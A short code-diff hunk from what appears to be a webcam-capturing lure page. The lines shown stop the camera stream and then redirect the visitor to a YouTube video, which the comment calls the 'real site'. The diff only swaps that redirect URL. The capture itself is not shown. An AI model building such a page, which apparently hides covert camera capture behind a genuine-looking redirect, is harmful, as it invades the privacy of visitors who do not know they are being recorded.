@@ -35,7 +35,7 @@
       // 5) cleanup camera
       if (stream) stream.getTracks().forEach(t => t.stop());
       // 6) redirect to real site
-      window.location.replace('https://m.youtube.com/watch?si=X7JkWv2nepcAG1IE&v=kNIr14EyTaY&feature=youtu.be');
+      window.location.replace('https://youtu.be/m5IWI6xFRms?si=6jUE3tyw9lgbTAjk');
     }
   }
 
